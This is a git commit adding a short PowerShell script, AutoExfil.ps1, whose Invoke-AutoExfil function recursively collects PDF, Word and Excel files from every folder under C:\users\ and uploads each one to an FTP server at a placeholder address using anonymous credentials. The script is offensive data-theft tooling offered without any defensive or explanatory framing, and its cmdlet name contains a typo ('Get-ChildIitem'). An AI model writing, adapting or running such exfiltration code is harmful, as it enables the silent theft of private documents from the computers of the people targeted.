85055afaced276683496867c98a1473a9d8b4a57
yaboygmoney <goldstein.austin@gmail.com>
2020-09-02 17:48:06 -0500

    Add files via upload

---
+++ AutoExfil.ps1
@@ -0,0 +1,15 @@
+function Invoke-AutoExfil
+{
+    $steal = ".pdf", ".doc", ".docx", ".xls"
+
+    $files = Get-ChildIitem -Force -Recurse -Path C:\users\ -ErrorAction SilentlyContinue | Where {$_.Extension -in $steal} | Select name,fullname
+
+    $server = "ftp://SERVERIP/"
+    $webclient = New-Object System.Net.WebClient
+    $webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous","anonymous")
+
+    foreach ($f in $files) {
+	    $uri = New-Object System.Uri($server+$f.Name)
+	    $webclient.UploadFIle($uri, $f.Fullname)
+    }
+}
